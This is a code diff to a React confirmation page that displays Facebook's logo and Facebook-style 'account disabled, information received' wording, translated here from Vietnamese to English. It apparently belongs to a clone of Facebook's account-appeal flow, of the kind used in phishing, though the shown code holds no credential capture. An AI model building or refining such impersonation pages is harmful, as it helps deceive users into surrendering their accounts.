@@ -4,9 +4,10 @@ import { useState, useMemo } from 'react';
 const SendInfo = () => {
     const defaultTexts = useMemo(
         () => ({
-            title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi.' ,
-            description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
-            description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.',
+            title: 'Our system has received your information.',
+            description1: 'If we still find that you are not old enough to use Facebook, your account will remain disabled. This is because your account does not comply with our Terms of Service.',
+            description2: 'We always care about the security of everyone on Facebook so you cannot use your account until then.',
+            helpCenter: 'Help Center' // Thêm text cho header
         }),
         []
     );
@@ -16,8 +17,6 @@ const SendInfo = () => {
     const [translatedTexts, setTranslatedTexts] = useState(
         translations?.sendInfo || defaultTexts
     );
-
-    // 🚀 XÓA HẾT hàm dịch và useEffect dịch thuật
 
     return (
         <div className='min-h-screen bg-gray-100'>
@@ -31,7 +30,7 @@ const SendInfo = () => {
                                 alt='Facebook' 
                                 className='h-8 w-8'
                             />
-                            <span className='text-lg font-semibold'>Trung tâm trợ giúp</span>
+                            <span className='text-lg font-semibold'>{translatedTexts.helpCenter || 'Help Center'}</span>
                         </div>
                     </div>
                 </div>
